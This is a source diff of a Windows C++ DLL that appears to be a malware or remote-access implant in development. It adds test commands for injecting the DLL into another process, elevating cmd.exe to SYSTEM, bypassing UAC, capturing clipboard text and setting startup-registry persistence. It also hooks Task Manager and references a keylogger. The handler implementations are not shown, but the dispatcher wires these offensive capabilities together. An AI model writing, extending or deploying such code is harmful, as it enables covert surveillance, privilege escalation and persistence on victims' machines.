@@ -5,37 +5,42 @@
 #include <shellapi.h>
 #include <Shlobj_core.h>
 
-#include "library.h"
+#include "export.h"
 #include "handlers/get_system.h"
 #include "runtime/utils.h"
 #include "handlers/keylog.h"
 #include "handlers/uac_bypass.h"
 #include "handlers/remote_dll_injection.h"
 #include "handlers/taskmgr_hook.h"
+#include "handlers/clipboard.h"
+#include "handlers/process_list.h"
+#include "handlers/startup.h"
 
 HINSTANCE hInst = NULL;                                // 当前实例
-wchar_t executable_path[MAX_PATH + 1];
-wchar_t module_path[MAX_PATH + 1];
-wchar_t* commandline;
-bool stand_alone = false;
-HINSTANCE hModule;
+WCHAR executable_path[MAX_PATH + 1];
+WCHAR module_path[MAX_PATH + 1];
+WCHAR* commandline;
+BOOL stand_alone = false;
+HINSTANCE hModule;   // dll模块实例
 
-std::ofstream ofs;
-bool file_opened;
+std::ofstream ofs; // 打开的文件流
+bool file_opened; // 是否打开文件
 
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved
                      )
 {
+    wchar_t* tmp = NULL;
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
         ::hModule = hModule;
         GetModuleFileName(NULL, executable_path, MAX_PATH);
         GetModuleFileName(hModule, module_path, MAX_PATH);
-        wchar_t * tmp = lstrcat_heap(L"C:\\Windows\\System32\\rundll32.exe", module_path);
+        tmp = lstrcat_heap(L"C:\\Windows\\System32\\rundll32.exe ", module_path);
         commandline = lstrcat_heap(tmp, L",EntryPoint ");
+        free(tmp);
         if (!_wcsicmp(executable_path, L"C:\\Windows\\System32\\rundll32.exe"))
         {
             MessageBox(0, L"Running", 0, 0);
@@ -43,7 +48,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
         }
         else if (!_wcsicmp(executable_path, L"C:\\WINDOWS\\system32\\taskmgr.exe"))
         {
-            StartHook();
+            SetHook();
         }
         else {
             MessageBox(0, L"Injected", 0, 0);
@@ -91,34 +96,73 @@ extern "C" LIBRARY_API void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPCS
         Sleep(10000);
         return;
     }
-    else if (!strcmp(lpszCmdLine, "injecthide"))
+    else if (!strcmp(lpszCmdLine, "injecttest"))
     {
-        MessageBox(0, L"injecthide", 0, 0);
-        injectDll(12008, module_path);
+        MessageBox(0, L"injecttest", 0, 0);
+        InjectDll(12008, module_path);
         while (true) Sleep(1000);
         return;
     }
+    else if (!strcmp(lpszCmdLine, "getsystemtest"))
+    {
+        MessageBox(0, L"getsystemtest", 0, 0);
+        ConsoleInit();
+        ElevatedExecute((LPCWSTR)NULL, (LPWSTR)L"C:\\Windows\\System32\\cmd.exe");
+        ElevateSelf();
+        while (true) Sleep(1000);
+        return;
+    }
+    else if (!strcmp(lpszCmdLine, "uactest"))
+    {
+        MessageBox(0, L"uactest", 0, 0);
+        ConsoleInit();
+        BypassUAC(L"C:\\Windows\\System32\\cmd.exe", NULL);
+        // 使用whoami /all 命令来看看是不是privilege变多了。
+        while (true) Sleep(1000);
+        return;
+    }
+    else if (!strcmp(lpszCmdLine, "cliptest"))
+    {
+        MessageBox(0, L"cliptest", 0, 0);
+        ConsoleInit();
+        while (true)
+        {
+            Sleep(1000);
+            _putws(GetClipboardTextHelper());
+        }
+        return;
+    }
+    else if (!strcmp(lpszCmdLine, "proclisttest"))
+    {
+        MessageBox(0, L"proclisttest", 0, 0);
+        ConsoleInit();
+        MY_PROC* head = NULL;
+        
+        while (true)
+        {
+            head = CreatProcList();
+            PrintProcList(head);
+            DestroyProcList(head);
+            head = NULL;
+            Sleep(1000);
 
-
-    //puts("hello, dll!");
-    //::MessageBox(0, L"HELLO", 0, 0);
-    //ConsoleInit();
-    //printf("Hello!\n");
-    //std::wcout << GetClipboardText() << std::endl;
-    //std::cout << "hello!" << std::endl;
-    //ofs.open("System32Log.txt");
+        }
+        return;
+    }
+    else if (!strcmp(lpszCmdLine, "startuptest"))
+    {
+        MessageBox(0, L"startuptest", 0, 0);
+        ConsoleInit();
+        SetStratupReg();
+        MessageBox(0, L"Created", 0, 0);
+        DeleteStratupReg();
+        while (true) Sleep(1000);
+        return;
+    }
     //RawInputKeyLogger.KeyLoggerInit(&ofs);
     //RawInputKeyLogger.KeyLoggerInit(&std::cout);
-
-    //setReg();
-    //EXE* head = NULL;
-    //head = creatList();
-    //printList(head);
-
     
-    //elevate_self();
     //ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, SW_SHOWNORMAL);
-    //while (true) Sleep(1000);
     
     //if (stand_alone)
     //{
@@ -146,7 +190,17 @@ extern "C" LIBRARY_API void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPCS
     //    //ofs.close();
     //    //while (true) Sleep(1000);
     //}
-
+    ConsoleInit();
+    //HookKeyLogger.KeyLoggerInit(&std::cout);
+    //printf("%u", GetPIDByName(L"taskmgr.exe"));
+    StartScanningThread();
+    MSG msg;
+    while (GetMessage(&msg, nullptr, 0, 0))
+    {
+        //puts(".");
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
 
     //return;
 }
